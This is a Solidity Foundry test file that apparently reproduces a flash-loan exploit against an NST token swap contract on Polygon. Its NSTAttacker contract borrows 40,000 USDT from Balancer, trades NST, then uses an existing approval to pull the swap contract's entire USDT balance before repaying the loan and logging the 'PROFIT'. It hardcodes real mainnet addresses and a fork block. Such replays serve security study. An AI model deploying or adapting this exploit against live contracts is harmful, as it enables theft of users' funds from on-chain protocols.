// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Test.sol";

// Need a flashLoan from balancer v2
// remember USDT 6 decimals  4 decimals NST token

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface SimpleSwap {
    function buyNST(uint amountUsdt) external returns (uint);

    function sellNST(uint amountNst) external returns (uint);
}

contract NSTAttacker {
    address constant simpleSwapAddress =
        0x9D101E71064971165Cd801E39c6B07234B65aa88;
    address constant NSTToken = 0x83eE54ccf462255ea3Ec56Fa8dE6797d679276e7;
    address constant USDTToken = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    IBalancerVault balancerV2 =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    SimpleSwap nstSwap = SimpleSwap(simpleSwapAddress);

    function attack() external {
        IERC20(NSTToken).approve(simpleSwapAddress, type(uint256).max);
        IERC20(USDTToken).approve(simpleSwapAddress, type(uint256).max);
        address[] memory add = new address[](1);
        add[0] = USDTToken;
        uint256[] memory amount = new uint256[](1);
        amount[0] = 40_000_000000; // 40 , 000 USDT
        balancerV2.flashLoan(address(this), add, amount, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console.log("Now the balance Of USDT in the contract ", amounts[0]);
        nstSwap.buyNST(38800_000000); // 38,800 USDT
        console.log(
            "NST BALANCE :%s",
            IERC20(NSTToken).balanceOf(address(this))
        );
        nstSwap.sellNST(376_360_0000); // we sell 376360 + 4 decimals
        console.log(
            "After the Swap USDT balance ",
            IERC20(USDTToken).balanceOf(address(this))
        );
        // we got approved so

        IERC20(USDTToken).transferFrom(
            simpleSwapAddress,
            address(this),
            IERC20(USDTToken).balanceOf(simpleSwapAddress)
        );
        console.log("[+] WE ARE PAYING BACK THE FLASHLOAN");
        IERC20(USDTToken).transfer(address(balancerV2), amounts[0]);
        console.log(
            "After FlashLoan payment remaining USDT for us PROFIT :)  ",
            IERC20(USDTToken).balanceOf(address(this))
        );
    }
}

contract NSTTEST is Test {
    address eoa;
    NSTAttacker nstAttacker;

    function setUp() public {
        vm.createSelectFork("polygon", 43430805);
        eoa = makeAddr("EOA");
    }

    function testSwap() public {
        vm.startPrank(eoa);
        nstAttacker = new NSTAttacker();
        nstAttacker.attack();
        vm.stopPrank();
    }
}
